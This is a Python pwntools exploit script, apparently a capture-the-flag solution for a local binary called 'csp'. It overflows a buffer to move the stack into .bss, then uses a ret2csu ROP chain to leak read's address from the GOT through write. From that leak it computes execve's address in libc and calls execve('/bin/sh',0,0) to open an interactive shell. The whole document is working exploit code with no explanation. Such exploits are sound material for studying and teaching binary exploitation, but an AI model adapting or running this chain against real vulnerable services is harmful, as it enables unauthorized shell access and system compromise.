#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
p = process('csp')
libc = ELF('libc.so.6')

write_got   = 0x0601018
read_got    = 0x0601020
read_ret    = 0x040059E  # lea  rax, [rbp-20h]
bss_start   = 0x0601048
stack_base  = bss_start + 0x20
p6r_gg 		= 0x040061A
m3c_gg 		= 0x0400600

def rop(func, arg1=0, arg2=0, arg3=0, ret=0xdeadbeef):
    tmp = (
            p64(p6r_gg),
            p64(0),
            p64(1),
            p64(func),
            p64(arg3),
            p64(arg2),
            p64(arg1),
            p64(m3c_gg),
            "\x00" * 16,
            p64(stack_base + 0x100), # 0x100 -> offset between new and old rbp
            "\x00" * 32,
            p64(ret),
            )
    return ''.join(tmp)

# step 1 control stack
raw_input("################1################")
payload1 = (
        "A" * 32,
        p64(stack_base),
        p64(read_ret),
        )
payload1 = ''.join(payload1)
p.recvuntil('me\n')
# gdb.attach(p, "b *0x04005af")
p.sendline(payload1)
log.success("stack controlled to bss.")
log.success("rsp = " + hex(bss_start))

# step 2 leak read addr
raw_input("################2################")
payload2 = (
        "B" * 40,
        rop(func=write_got, arg1=1, arg2=read_got, arg3=8, ret=read_ret),
        )
payload2 = ''.join(payload2)
p.sendline(payload2)

# clac addr of execve
read        = u64(p.recv(8))
read_libc   = libc.symbols['read']
execve_libc = libc.symbols['execve']
execve      = read - read_libc + execve_libc
log.success("read   = " + hex(read))
log.success("execve = " + hex(execve))

# step 3 execve("/bin/sh",0,0)
raw_input("################3################")
binsh = bss_start + 0x100
payload3 = (
        "/bin/sh\0",
        p64(execve),
        "C" * 24,
        rop(func=bss_start+0x100+0x8, arg1=bss_start+0x100),
        )
payload3 = ''.join(payload3)
p.sendline(payload3)
log.success("Done: execve(\"/bin/sh\",0,0);")
log.success("enjoy your shell:")

p.interactive()